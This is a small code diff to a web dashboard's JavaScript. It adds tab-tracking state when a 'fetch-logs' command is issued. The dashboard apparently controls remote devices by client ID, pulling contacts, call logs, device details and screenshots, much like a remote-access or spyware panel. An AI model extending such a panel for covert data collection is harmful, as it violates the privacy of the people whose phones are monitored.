@@ -184,6 +184,8 @@
 
   <script>
     // --- Basic device info from URL ---
+	let expectedTab = null;
+
     const pathParts = window.location.pathname.split("/");
     const clientId = pathParts[pathParts.length - 1] || "unknown";
     const urlParams = new URLSearchParams(location.search);
@@ -289,7 +291,7 @@
         } else if (cmd === 'fetch-contact') {
           setActiveTab('contacts'); contactsLoading.textContent = 'Loading contacts...'; contactsList.innerHTML = '';
         } else if (cmd === 'fetch-logs') {
-          setActiveTab('calls'); callsLoading.textContent = 'Loading calls...'; callsList.innerHTML = '';
+          expectedTab = "calls"; setActiveTab('calls'); callsLoading.textContent = 'Loading calls...'; callsList.innerHTML = '';
         } else if (cmd === 'fetch-device') {
           setActiveTab('device'); deviceLoading.textContent = 'Loading device info...'; deviceTable.innerHTML = '';
         } else if (cmd === 'fetch-screenshot') {
